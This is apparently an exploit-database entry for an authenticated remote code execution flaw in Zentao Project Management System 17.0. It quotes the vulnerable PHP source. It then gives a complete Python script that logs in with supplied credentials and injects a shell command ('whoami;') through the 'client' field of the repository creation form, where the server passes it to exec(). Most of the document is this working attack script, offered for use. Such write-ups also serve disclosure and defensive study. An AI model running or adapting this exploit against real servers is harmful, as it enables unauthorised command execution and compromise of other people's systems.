@@ -1,0 +1,117 @@
+id: 38317
+date: 03/27/2023
+title: Zentao Project Management System 17.0 - Authenticated Remote Code Execution Exploit
+author: mister0xf
+cves: 
+
+# Exploit Title: Zentao Project Management System 17.0 - Authenticated Remote Code Execution (RCE)
+# Exploit Author: mister0xf 
+# Software Link: https://github.com/easysoft/zentaopms
+# Version: tested on 17.0 (probably works also on newer/older versions)
+# Tested On: Kali Linux 2022.2
+# Exploit Tested Using: Python 3.10.4
+# Vulnerability Description:
+# Zentao Project Management System 17.0 suffers from an authenticated command injection allowing 
+# remote attackers to obtain Remote Code Execution (RCE) on the hosting webserver 
+
+# Vulnerable Source Code:
+# /module/repo/model.php:
+# [...]
+# $client = $this->post->client; // <-- client is taken from the POST request
+# [...]
+# elseif($scm == 'Git')
+#        {
+#            if(!is_dir($path))
+#            {
+#                dao::$errors['path'] = sprintf($this->lang->repo->error->noFile, $path);
+#                return false;
+#            }
+#
+#            if(!chdir($path))
+#            {
+#                if(!is_executable($path))
+#                {
+#                    dao::$errors['path'] = sprintf($this->lang->repo->error->noPriv, $path);
+#                    return false;
+#                }
+#                dao::$errors['path'] = $this->lang->repo->error->path;
+#                return false;
+#            }
+#
+#            $command = "$client tag 2>&1"; // <-- command is injected here
+#            exec($command, $output, $result);
+
+import requests,sys
+import hashlib
+from urllib.parse import urlparse
+from bs4 import BeautifulSoup
+
+def banner():
+    print('''
+          ::::::::: :::::::::: ::::    :::  :::::::: :::::::::::     :::      ::::::::
+          :+:  :+:        :+:+:   :+: :+:    :+:    :+:       :+: :+:   :+:    :+:
+        +:+   +:+        :+:+:+  +:+ +:+           +:+      +:+   +:+  +:+    +:+
+      +#+    +#++:++#   +#+ +:+ +#+ +#+           +#+     +#++:++#++: +#+    +:+
+    +#+     +#+        +#+  +#+#+# +#+           +#+     +#+     +#+ +#+    +#+
+  #+#      #+#        #+#   #+#+# #+#    #+#    #+#     #+#     #+# #+#    #+#
+######### ########## ###    ####  ######## ########### ###     ###  ########
+    ''')
+def usage():
+    print('Usage: zenciao user password http://127.0.0.1/path')
+    
+def main():
+
+    if ((len(sys.argv)-1) != 3):
+        usage()
+        banner()
+        exit()
+
+    #proxy = {'http':'http://127.0.0.1:8080'}
+
+    banner()
+    username = sys.argv[1] 
+    password = sys.argv[2] 
+    target = sys.argv[3]
+
+    # initialize session object
+    session = requests.session()
+  
+    home_url = target+'/index.php'
+    rand_url = target+'/index.php?m=user&f=refreshRandom&t=html'
+    login_url = target+'/index.php?m=user&f=login&t=html'
+    create_repo_url = target+'/index.php?m=repo&f=create&objectID=0'
+
+    r1 = session.get(home_url)
+    soup = BeautifulSoup(r1.text, "html.parser")
+    script_tag = soup.find('script')
+    redirect_url = script_tag.string.split("'")[1]
+    r2 = session.get(target+redirect_url)
+
+    # get random value
+    session.headers.update({'X-Requested-With': 'XMLHttpRequest'})
+    res = session.get(rand_url)
+    rand = res.text
+
+    # compute md5(md5(password)+rand)
+    md5_pwd = hashlib.md5((hashlib.md5(password.encode()).hexdigest()+str(rand)).encode())
+
+    # login request
+    post_data = {"account":username,"password":md5_pwd.hexdigest(),"passwordStrength":1,"referer":"/zentaopms/www/","verifyRand":rand,"keepLogin":0,"captcha":""}
+    my_referer = target+'/zentaopms/www/index.php?m=user&f=login&t=html'
+    session.headers.update({'Referer': my_referer})
+    session.headers.update({'X-Requested-With': 'XMLHttpRequest'})
+    response = session.post(login_url, data=post_data) 
+
+    # exploit rce
+    # devops repo page
+    r2 = session.get(create_repo_url)
+    git_test_dir = '/home/'
+    command = 'whoami;'
+    exploit_post_data = {"SCM":"Git","name":"","path":git_test_dir,"encoding":"utf-8","client":command,"account":"","password":"","encrypt":"base64","desc":""}
+    r3 = session.post(create_repo_url, data=exploit_post_data)
+    print(r3.content)
+
+if __name__ == '__main__':
+    main()
+
+#  0day.today [2023-04-03]  #
